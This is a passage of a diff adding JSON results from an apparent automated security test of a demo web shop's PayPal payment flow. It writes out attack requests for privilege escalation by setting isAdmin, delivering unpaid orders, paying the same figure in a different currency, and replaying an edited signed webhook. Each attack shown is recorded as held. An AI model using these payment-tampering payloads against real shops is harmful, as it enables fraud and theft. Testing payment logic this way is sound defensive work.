+              "result": "HTTP 401 {\"message\":\"Not authorized as an admin\",\"stack\":null}"
+            },
+            {
+              "step": {
+                "do": "buy",
+                "tamper": {},
+                "blockCapture": false,
+                "save": "b"
+              },
+              "result": "PayPal order 8XK241512F383323H, approved, capture COMPLETED, shop order 6af070bacc824b9400d76b74 paid"
+            }
+          ],
+          "mismatches": []
+        },
+        {
+          "name": "Deliver an unpaid order",
+          "idea": "The deliver endpoint may set isDelivered without checking isPaid, and the profile endpoint may provide the admin privilege it requires.",
+          "expect": "An order that was never paid is marked delivered and enters shipment.",
+          "verdict": "held",
+          "summary": "The books still match PayPal's records: nothing taken.",
+          "steps": [
+            {
+              "step": {
+                "do": "request",
+                "method": "PUT",
+                "path": "/api/users/profile",
+                "body": {
+                  "name": "John Doe",
+                  "email": "john@email.com",
+                  "isAdmin": true
+                },
+                "headers": {},
+                "times": 1,
+                "together": false,
+                "save": "a"
+              },
+              "result": "HTTP 200 {\"_id\":\"6af06edf5a27e3b99341f11e\",\"name\":\"John Doe\",\"email\":\"john@email.com\",\"isAdmin\":false}"
+            },
+            {
+              "step": {
+                "do": "request",
+                "method": "POST",
+                "path": "/api/orders",
+                "body": {
+                  "orderItems": [
+                    {
+                      "_id": "6af06edf5a27e3b99341f125",
+                      "user": "6af06edf5a27e3b99341f11d",
+                      "name": "Sony Playstation 5",
+                      "image": "/images/playstation.jpg",
+                      "brand": "Sony",
+                      "category": "Electronics",
+                      "description": "The ultimate home entertainment center starts with PlayStation. Whether you are into gaming, HD movies, television, music",
+                      "rating": 5,
+                      "numReviews": 12,
+                      "price": 399.99,
+                      "countInStock": 11,
+                      "reviews": [],
+                      "__v": 0,
+                      "createdAt": "2026-11-08T12:45:19.741Z",
+                      "updatedAt": "2026-11-08T12:45:19.741Z",
+                      "qty": 1
+                    }
+                  ],
+                  "shippingAddress": {
+                    "address": "2211 N First St",
+                    "city": "San Jose",
+                    "postalCode": "95131",
+                    "country": "United States"
+                  },
+                  "paymentMethod": "PayPal",
+                  "itemsPrice": "399.99",
+                  "shippingPrice": "0.00",
+                  "taxPrice": "60.00",
+                  "totalPrice": "459.99"
+                },
+                "headers": {},
+                "times": 1,
+                "together": false,
+                "save": "c"
+              },
+              "result": "HTTP 201 {\"user\":\"6af06edf5a27e3b99341f11e\",\"orderItems\":[{\"name\":\"Sony Playstation 5\",\"qty\":1,\"image\":\"/images/playstation.jpg\",\"price\":399.99,\"product\":\"6af06edf5a27e3..."
+            },
+            {
+              "step": {
+                "do": "request",
+                "method": "PUT",
+                "path": "/api/orders/{{c.body._id}}/deliver",
+                "body": {},
+                "headers": {},
+                "times": 1,
+                "together": false,
+                "save": "d"
+              },
+              "result": "HTTP 401 {\"message\":\"Not authorized as an admin\",\"stack\":null}"
+            },
+            {
+              "step": {
+                "do": "request",
+                "method": "GET",
+                "path": "/api/orders/{{c.body._id}}",
+                "body": {},
+                "headers": {},
+                "times": 1,
+                "together": false,
+                "save": "e"
+              },
+              "result": "HTTP 200 {\"shippingAddress\":{\"address\":\"2211 N First St\",\"city\":\"San Jose\",\"postalCode\":\"95131\",\"country\":\"United States\"},\"_id\":\"6af070decc824b9400d76b87\",\"user\":{\"_id\"..."
+            }
+          ],
+          "mismatches": []
+        },
+        {
+          "name": "Pay the right number in the wrong currency",
+          "idea": "Payment verification may compare only the numeric amount value and ignore currency_code, so 459.99 Philippine pesos may be treated as 459.99 US dollars.",
+          "expect": "The shop marks the $459.99 order paid after a capture worth only about $8.",
+          "verdict": "held",
+          "summary": "The books still match PayPal's records: nothing taken.",
+          "steps": [
+            {
+              "step": {
+                "do": "buy",
+                "tamper": {
+                  "purchase_units": [
+                    {
+                      "reference_id": "default",
+                      "amount": {
+                        "currency_code": "PHP",
+                        "value": "459.99"
+                      }
+                    }
+                  ]
+                },
+                "blockCapture": false,
+                "save": "b"
+              },
+              "result": "PayPal order 9CX44531H8801221E, approved, capture COMPLETED, shop order 6af0715dcc824b9400d76bae paid"
+            },
+            {
+              "step": {
+                "do": "request",
+                "method": "GET",
+                "path": "/api/orders/{{b.shopOrderId}}",
+                "body": {},
+                "headers": {},
+                "times": 1,
+                "together": false,
+                "save": "a"
+              },
+              "result": "HTTP 200 {\"shippingAddress\":{\"address\":\"2211 N First St\",\"city\":\"San Jose\",\"postalCode\":\"95131\",\"country\":\"United States\"},\"paymentResult\":{\"id\":\"9CX44531H8801221E\",\"sta..."
+            }
+          ],
+          "mismatches": []
+        },
+        {
+          "name": "Redirect a real $0.01 webhook to a $459.99 order",
+          "idea": "A webhook handler may trust the edited resource amount and custom_id while retaining the original signature headers, without refetching the capture from PayPal or cryptographically revalidating the edited body.",
+          "expect": "A fresh unpaid $459.99 shop order becomes paid although the referenced real capture was only $0.01.",
+          "verdict": "held",
+          "summary": "The books still match PayPal's records: nothing taken.",
+          "steps": [
+            {
+              "step": {
+                "do": "request",
+                "method": "POST",
+                "path": "/api/orders",
+                "body": {
+                  "orderItems": [
+                    {
+                      "_id": "6af06edf5a27e3b99341f125",
+                      "user": "6af06edf5a27e3b99341f11d",
+                      "name": "Sony Playstation 5",
+                      "image": "/images/playstation.jpg",
+                      "brand": "Sony",
+                      "category": "Electronics",
+                      "description": "The ultimate home entertainment center starts with PlayStation. Whether you are into gaming, HD movies, television, music",
+                      "rating": 5,
+                      "numReviews": 12,
+                      "price": 399.99,
+                      "countInStock": 11,
+                      "reviews": [],
+                      "__v": 0,
+                      "createdAt": "2026-11-08T12:45:19.741Z",
+                      "updatedAt": "2026-11-08T12:45:19.741Z",
+                      "qty": 1
+                    }
+                  ],
+                  "shippingAddress": {
+                    "address": "2211 N First St",
+                    "city": "San Jose",
+                    "postalCode": "95131",
+                    "country": "United States"
+                  },
+                  "paymentMethod": "PayPal",
+                  "itemsPrice": "399.99",
+                  "shippingPrice": "0.00",
+                  "taxPrice": "60.00",
+                  "totalPrice": "459.99"
+                },
+                "headers": {},
+                "times": 1,
+                "together": false,
+                "save": "a"
+              },
+              "result": "HTTP 201 {\"user\":\"6af06edf5a27e3b99341f11e\",\"orderItems\":[{\"name\":\"Sony Playstation 5\",\"qty\":1,\"image\":\"/images/playstation.jpg\",\"price\":399.99,\"product\":\"6af06edf5a27e3..."
+            },
+            {
+              "step": {
+                "do": "webhook",
+                "event": "PAYMENT.CAPTURE.COMPLETED",
+                "edit": {
+                  "resource.amount.value": "459.99",
+                  "resource.amount.currency_code": "USD",
+                  "resource.custom_id": "{{a.body._id}}",
+                  "resource.supplementary_data.related_ids.order_id": "{{legit.paypalOrderId}}",
+                  "resource.status": "COMPLETED"
+                },
+                "signed": true,
+                "times": 1
+              },
+              "result": "resent PAYMENT.CAPTURE.COMPLETED WH-1Y92486113404022L-4E517168WV296005C (edited, with PayPal's headers): shop answered 404"
+            },
+            {
+              "step": {
+                "do": "request",
+                "method": "GET",
+                "path": "/api/orders/{{a.body._id}}",
+                "body": {},
+                "headers": {},
+                "times": 1,
+                "together": false,
+                "save": "c"
+              },
+              "result": "HTTP 200 {\"shippingAddress\":{\"address\":\"2211 N First St\",\"city\":\"San Jose\",\"postalCode\":\"95131\",\"country\":\"United States\"},\"_id\":\"6af07185cc824b9400d76bc2\",\"user\":{\"_id\"..."
+            }
+          ],
+          "mismatches": []
+        }
+      ]
+    }
+  }
+]
